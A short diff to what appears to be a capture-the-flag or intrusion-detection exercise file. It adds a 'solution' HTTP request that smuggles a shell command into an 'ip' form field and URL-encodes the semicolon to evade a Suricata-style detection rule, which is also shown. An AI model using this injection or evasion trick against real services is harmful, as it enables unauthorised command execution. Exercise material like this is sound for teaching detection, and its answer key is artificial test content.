@@ -19,8 +19,18 @@ base_request: |-
 
   ip=1.2.3.4; cat /app/dragon-detector-ai
 
+solution: |-
+  POST /detect-dragon.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 40
+
+  ip=1.2.3.4%3bcat /app/dragon-detector-ai
+
+solution_note: missing url_decode
+
 rules:
-# Still lets & work, also no urldecode
+# no urldecode
 - >
   alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; pcre: "/ip=[^&]*[\;|&`$()]/"; sid:123456; rev:1;)
 - >
